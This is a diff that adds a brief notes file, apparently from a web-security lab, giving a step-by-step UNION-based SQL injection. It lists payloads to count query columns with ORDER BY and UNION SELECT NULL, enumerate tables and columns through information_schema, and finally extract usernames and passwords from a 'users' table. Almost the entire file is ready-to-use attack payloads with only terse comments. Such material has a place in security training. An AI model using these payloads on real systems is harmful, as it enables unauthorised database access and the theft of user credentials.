@@ -1,0 +1,18 @@
+#Step 1:  First of all find the number of columns using any of these methods:-
+
+1. ' order by 1--
+2. ' union select null,null --
+
+# ' order by 2-- returns 200 OK, that means there are only two columns selected.
+
+#Step 2:  Find 'users' table, by listing all the tables from the information schema.
+
+' union select table_name,null from information_schema.tables--
+
+# Step 3:
+
+' union select column_name,null from information_schema.columns where table_name = 'users'--
+
+# Step 4:
+
+' union select username,password from users--
